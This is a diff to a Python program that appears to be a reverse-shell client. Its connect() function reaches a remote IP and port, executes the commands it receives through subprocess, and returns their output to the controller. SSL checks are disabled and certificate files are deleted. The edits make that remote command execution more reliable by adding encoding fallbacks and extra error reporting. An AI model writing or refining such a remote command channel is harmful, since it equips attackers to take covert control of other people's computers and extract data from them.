@@ -11,7 +11,7 @@ from signal import SIGTERM
 from random import randint, uniform, choice
 import argparse
 
-
+ENCODING_LST = ['utf-8','cp1252']
 #IGNORE SSL CHECKS
 
 try:
@@ -150,7 +150,7 @@ def delete_keys():
         remove("client_cert")
         remove("server_cert")
     except FileNotFoundError:
-        if VERBOSE:
+        if DEBUG:
             print_warn("Unable to Delete SSL Keys")
 
 def sysinfo():
@@ -383,9 +383,12 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                         if output.stderr != b"":
                             send_data(conn, output.stderr.decode('utf-8')) # send back the errors
                         elif output.stdout == b"":
-                            send_data(conn, "ERROR --> {}".format(data))
+                            send_data(conn, "ERROR/EMPTY RESPONSE --> {}".format(data))
                         else:
-                            send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                            try:
+                                send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                            except UnicodeDecodeError:
+                                send_data(conn, output.stdout.decode('cp1252')) # send back the result
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
                             print_warn("Command Execution Timeout Expired")
@@ -393,6 +396,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     except Exception as e:
                         if VERBOSE:
                             print_fail("Exception! --> {}".format(e))
+                            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                         send_data(conn,e)
                 data = "" #reset the data received
     except Exception as e:
